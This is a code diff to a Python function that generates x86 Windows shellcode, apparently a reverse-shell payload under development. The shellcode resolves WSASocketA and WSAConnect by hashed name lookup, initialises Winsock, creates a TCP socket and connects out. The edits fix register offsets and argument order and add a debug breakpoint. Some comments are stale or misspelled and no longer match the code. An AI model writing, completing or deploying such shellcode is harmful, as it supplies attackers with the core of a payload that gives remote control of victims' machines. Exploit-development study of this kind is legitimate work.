@@ -343,16 +343,22 @@ def ret_asm() -> str:
     RESOLVE_SYMBOLS_WSASOCKETA:
         push {hashFuncName("WSASocketA")}           ; Push ROR hash of "WSASocketA" function name
         call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
-        mov [ebp + 0x24], eax                       ; Store WSASocketA address in [EBP+0x24]
+        mov [ebp + 0x20], eax                       ; Store WSASocketA address in [EBP+0x20]
     
-    ; ===== CALL_WSASOCKETA: Setup args and call WSASocketA =====
+    RESOLVE_SYMBOLS_WSACONNECT:
+        push {hashFuncName("WSAConnect")}           ; Push ROR hash of "WSASConnect" function name
+        call [ebp + 0x04]                           ; Call FIND_FUNCTION to resolve address
+        mov [ebp + 0x24], eax                       ; Store WSASConnect address in [EBP+0x24]
+
+    
+    ; ===== CALL_WSASTARTUP: Setup args and call WSAStartup =====
     CALL_WSASTARTUP:
         mov eax, esp                                ; EAX = ESP
         mov cx, 0x590                               ; CX = 0x590
         sub eax, ecx                               ; EAX -= ECX to avoid overwriting stack
         push eax                                    ; Push pointer to WSADATA structure
         xor eax, eax                                ; EAX = 0
-        mov ax, 0x202                              ; AX = MAKEWORD(2,2)
+        mov ax, 0x0202                              ; AX = MAKEWORD(2,2)
         push eax                                    ; Push wVersionRequested = MAKEWORD(2,2)
         call [ebp + 0x1C]                           ; Call WSAStartup(MAKEWORD(2,2), &WSADATA)
 
@@ -360,15 +366,17 @@ def ret_asm() -> str:
     CALL_WSASOCKETA:
         xor eax, eax                                ; EAX = 0
         push eax                                    ; Push dwFlags = 0
-        push eax                                    ; Push lpProtocol = 0
-        push eax                                    ; Push iProtocol = 0
-        mov al, 0x06                                ; EAX = 6 (SOCK_STREAM)
-        push eax                                    ; Push iType = SOCK_STREAM
-        sub al, 0x05                                ; EAX = 2 (AF_INET)
-        push eax                                    ; Push af = AF_INET
-        inc eax                                     ; EAX = 1 (IPPROTO_IP)
-        push eax                                    ; Push protocol = IPPROTO_IP
-        call [ebp + 0x24]                           ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, 0, 0, 0)
+        push eax                                    ; Push g = 0
+        push eax                                    ; Push lpProtocolInfo = 0
+        mov al, 0x06                                ; EAX = 6 (AL, IPPROTO_TCP)
+        push eax                                    ; Push Protocol
+        sub al, 0x05                                ; EAX = 1 (Type)
+        push eax                                    ; Push Type
+        inc eax                                     ; EAX = 2 (AF)
+        push eax                                    ; Push AF
+        call [ebp + 0x20]                           ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, 0, 0, 0)
+
+        int3
 
     ; ===== CALL_WSACONNECT: Setup args and call WSAConnect =====
     CALL_WSACONNECT:
@@ -395,7 +403,7 @@ def ret_asm() -> str:
         push eax                                    ; Push iSockaddrLength
         push edi                                    ; Push lpSockaddr
         push esi                                    ; Push s (socket descriptor)
-        call [ebp + 0x28]                           ; Call WSAConnect
+        call [ebp + 0x24]                           ; Call WSAConnect
 
         
         
